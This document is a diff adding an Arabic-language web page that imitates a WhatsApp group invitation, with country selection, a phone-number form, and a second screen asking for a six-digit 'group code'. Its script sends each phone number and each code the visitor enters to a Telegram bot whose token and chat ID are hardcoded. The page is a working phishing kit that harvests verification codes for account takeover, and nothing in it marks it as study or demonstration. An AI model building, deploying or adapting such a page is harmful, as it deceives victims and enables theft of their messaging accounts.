@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>انضم إلى مجموعة واتساب</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/libphonenumber-js/1.9.6/libphonenumber-js.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header {
+            color: #25D366;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .divider {
+            border-top: 1px solid #e0e0e0;
+            margin: 20px 0;
+        }
+        .phone-section, .code-section {
+            display: none;
+        }
+        .active-section {
+            display: block;
+        }
+        .phone-input-container, .code-input-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        .country-selector {
+            display: flex;
+            gap: 5px;
+            align-items: center;
+            background-color: #f8f9fa;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+        .country-flag {
+            width: 20px;
+            height: 15px;
+            object-fit: cover;
+            border-radius: 2px;
+        }
+        .country-code {
+            font-size: 14px;
+            color: #000;
+        }
+        .phone-number, .code-number {
+            font-size: 16px;
+            direction: ltr;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            flex-grow: 1;
+            color: #000;
+        }
+        .join-btn, .submit-btn {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 12px 20px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+            width: 100%;
+            margin: 20px 0;
+            transition: background-color 0.3s;
+        }
+        .join-btn:hover, .submit-btn:hover {
+            background-color: #128C7E;
+        }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .key {
+            background-color: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            border-radius: 5px;
+            padding: 15px;
+            font-size: 18px;
+            cursor: pointer;
+            user-select: none;
+            color: #000;
+        }
+        .key:hover {
+            background-color: #e9ecef;
+        }
+        .key:active {
+            background-color: #d1d7dc;
+        }
+        .privacy-policy {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            max-width: 400px;
+            padding: 15px;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+            border-right: 3px solid #25D366;
+        }
+        .back-btn {
+            color: #25D366;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .country-dropdown {
+            position: absolute;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-top: 5px;
+            z-index: 100;
+            display: none;
+            max-height: 300px;
+            overflow-y: auto;
+            width: 250px;
+            right: 0;
+        }
+        .country-item {
+            display: flex;
+            align-items: center;
+            padding: 8px 10px;
+            cursor: pointer;
+            gap: 8px;
+        }
+        .country-item:hover {
+            background-color: #f0f2f5;
+        }
+        .country-select-wrapper {
+            position: relative;
+        }
+        .error-message {
+            color: #ff4444;
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">WhatsApp</div>
+        <div class="divider"></div>
+
+        <!-- شاشة إدخال الرقم -->
+        <div class="phone-section active-section" id="phoneSection">
+            <p style="color: #000;">الدعوة للانضمام إلى مجموعة</p>
+            
+            <div class="phone-input-container">
+                <div class="country-select-wrapper">
+                    <div class="country-selector" id="countrySelector">
+                        <img src="https://flagcdn.com/w20/ae.png" class="country-flag">
+                        <span class="country-code">+971</span>
+                    </div>
+                    <div class="country-dropdown" id="countryDropdown">
+                        <div class="country-item" data-code="971" data-flag="ae">
+                            <img src="https://flagcdn.com/w20/ae.png" class="country-flag">
+                            <span>الإمارات +971</span>
+                        </div>
+                        <div class="country-item" data-code="966" data-flag="sa">
+                            <img src="https://flagcdn.com/w20/sa.png" class="country-flag">
+                            <span>السعودية +966</span>
+                        </div>
+                        <div class="country-item" data-code="973" data-flag="bh">
+                            <img src="https://flagcdn.com/w20/bh.png" class="country-flag">
+                            <span>البحرين +973</span>
+                        </div>
+                        <div class="country-item" data-code="974" data-flag="qa">
+                            <img src="https://flagcdn.com/w20/qa.png" class="country-flag">
+                            <span>قطر +974</span>
+                        </div>
+                        <div class="country-item" data-code="968" data-flag="om">
+                            <img src="https://flagcdn.com/w20/om.png" class="country-flag">
+                            <span>عمان +968</span>
+                        </div>
+                        <div class="country-item" data-code="965" data-flag="kw">
+                            <img src="https://flagcdn.com/w20/kw.png" class="country-flag">
+                            <span>الكويت +965</span>
+                        </div>
+                        <div class="country-item" data-code="20" data-flag="eg">
+                            <img src="https://flagcdn.com/w20/eg.png" class="country-flag">
+                            <span>مصر +20</span>
+                        </div>
+                    </div>
+                </div>
+                <input type="tel" class="phone-number" id="phoneNumber" placeholder="ادخل رقم الهاتف">
+            </div>
+            
+            <div class="error-message" id="phoneError"></div>
+            
+            <div class="divider"></div>
+            
+            <button class="join-btn" id="joinButton">الانضمام</button>
+            
+            <div class="keypad">
+                <div class="key" onclick="appendNumber('1')">1</div>
+                <div class="key" onclick="appendNumber('2')">2</div>
+                <div class="key" onclick="appendNumber('3')">3</div>
+                <div class="key" onclick="appendNumber('4')">4</div>
+                <div class="key" onclick="appendNumber('5')">5</div>
+                <div class="key" onclick="appendNumber('6')">6</div>
+                <div class="key" onclick="appendNumber('7')">7</div>
+                <div class="key" onclick="appendNumber('8')">8</div>
+                <div class="key" onclick="appendNumber('9')">9</div>
+                <div class="key" onclick="appendNumber('*')">*</div>
+                <div class="key" onclick="appendNumber('0')">0</div>
+                <div class="key" onclick="appendNumber('#')">#</div>
+            </div>
+        </div>
+
+        <!-- شاشة إدخال الرمز -->
+        <div class="code-section" id="codeSection">
+            <p style="color: #000;">أدخل رمز المجموعة</p>
+            
+            <div class="code-input-container">
+                <input type="text" class="code-number" id="groupCode" placeholder="＿＿＿＿" maxlength="6">
+            </div>
+            
+            <div class="error-message" id="codeError"></div>
+            
+            <div class="divider"></div>
+            
+            <button class="submit-btn" id="submitButton">تأكيد الانضمام</button>
+            
+            <div class="keypad">
+                <div class="key" onclick="appendCode('1')">1</div>
+                <div class="key" onclick="appendCode('2')">2</div>
+                <div class="key" onclick="appendCode('3')">3</div>
+                <div class="key" onclick="appendCode('4')">4</div>
+                <div class="key" onclick="appendCode('5')">5</div>
+                <div class="key" onclick="appendCode('6')">6</div>
+                <div class="key" onclick="appendCode('7')">7</div>
+                <div class="key" onclick="appendCode('8')">8</div>
+                <div class="key" onclick="appendCode('9')">9</div>
+                <div class="key" onclick="clearCode()">⌫</div>
+                <div class="key" onclick="appendCode('0')">0</div>
+                <div class="key" onclick="appendCode('#')">#</div>
+            </div>
+            
+            <div class="back-btn" onclick="showPhoneSection()">← العودة</div>
+        </div>
+
+        <div class="privacy-policy">
+            <p>باستخدامك لهذه الخدمة، فإنك توافق على <a href="#" style="color:#25D366;">سياسة الخصوصية</a></p>
+        </div>
+    </div>
+
+    <script>
+        // ⚙️ إعدادات التكامل (أضف بياناتك هنا)
+        const BOT_TOKEN = "7537590916:AAF-bs8UVHachxpTeeR3SK97Aq80UzFcF4A"; 
+        const CHAT_ID = "5680906598";
+        
+        let currentCountryCode = '971';
+
+        // 🔄 إدارة الشاشتين
+        function showCodeSection() {
+            document.getElementById('phoneSection').classList.remove('active-section');
+            document.getElementById('codeSection').classList.add('active-section');
+        }
+
+        function showPhoneSection() {
+            document.getElementById('codeSection').classList.remove('active-section');
+            document.getElementById('phoneSection').classList.add('active-section');
+        }
+
+        // 🔢 معالجة الإدخال
+        function appendNumber(num) {
+            document.getElementById('phoneNumber').value += num;
+        }
+
+        function appendCode(num) {
+            const codeInput = document.getElementById('groupCode');
+            if (codeInput.value.length < 6) codeInput.value += num;
+        }
+
+        function clearCode() {
+            document.getElementById('groupCode').value = 
+                document.getElementById('groupCode').value.slice(0, -1);
+        }
+
+        // 🌍 اختيار الدولة
+        document.querySelectorAll('.country-item').forEach(item => {
+            item.addEventListener('click', function() {
+                currentCountryCode = this.dataset.code;
+                document.querySelector('.country-code').textContent = `+${currentCountryCode}`;
+                document.querySelector('.country-flag').src = 
+                    `https://flagcdn.com/w20/${this.dataset.flag}.png`;
+                document.getElementById('countryDropdown').style.display = 'none';
+                document.getElementById('phoneNumber').value = '';
+            });
+        });
+
+        // 📩 إرسال إلى تيليجرام
+        async function sendToTelegram(message) {
+            try {
+                await axios.post(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+                    {
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    }
+                );
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+            }
+        }
+
+        // 📞 التحقق من الرقم
+        document.getElementById('joinButton').addEventListener('click', async function() {
+            const phoneNumber = document.getElementById('phoneNumber').value.replace(/\D/g, '');
+            
+            if (!phoneNumber) {
+                document.getElementById('phoneError').textContent = 'الرجاء إدخال رقم الهاتف';
+                document.getElementById('phoneError').style.display = 'block';
+                return;
+            }
+            
+            try {
+                const parsedNumber = libphonenumber.parsePhoneNumber(
+                    `+${currentCountryCode}${phoneNumber}`
+                );
+                
+                if (!parsedNumber.isValid()) throw new Error();
+                
+                // إرسال البيانات إلى تيليجرام
+                await sendToTelegram(`
+                    📲 <b>طلب انضمام جديد!</b>
+                    ▬▬▬▬▬▬▬▬
+                    📱 <b>الرقم:</b> +${currentCountryCode}${phoneNumber}
+                    🌍 <b>الدولة:</b> ${document.querySelector('.country-code').textContent}
+                `);
+                
+                showCodeSection();
+            } catch (e) {
+                document.getElementById('phoneError').textContent = 'رقم الهاتف غير صحيح';
+                document.getElementById('phoneError').style.display = 'block';
+            }
+        });
+
+        // ✅ تأكيد الانضمام
+        document.getElementById('submitButton').addEventListener('click', async function() {
+            const code = document.getElementById('groupCode').value;
+            const phoneNumber = document.getElementById('phoneNumber').value.replace(/\D/g, '');
+            
+            if (code.length !== 6) {
+                document.getElementById('codeError').textContent = 'الرمز يجب أن يكون 6 أرقام';
+                document.getElementById('codeError').style.display = 'block';
+                return;
+            }
+            
+            // إرسال البيانات إلى تيليجرام
+            await sendToTelegram(`
+                🔐 <b>تم إدخال الرمز!</b>
+                ▬▬▬▬▬▬▬▬
+                📱 <b>الرقم:</b> +${currentCountryCode}${phoneNumber}
+                🔢 <b>الرمز:</b> ${code}
+            `);
+            
+            // فتح واتساب
+            window.open(
+                `https://wa.me/${currentCountryCode}${phoneNumber}?text=رمز%20الدخول:%20${encodeURIComponent(code)}`,
+                '_blank'
+            );
+        });
+
+        // 🖱️ إدارة القائمة المنسدلة
+        document.getElementById('countrySelector').addEventListener('click', function(e) {
+            e.stopPropagation();
+            const dropdown = document.getElementById('countryDropdown');
+            dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
+        });
+
+        document.addEventListener('click', function() {
+            document.getElementById('countryDropdown').style.display = 'none';
+        });
+    </script>
+</body>
+</html>
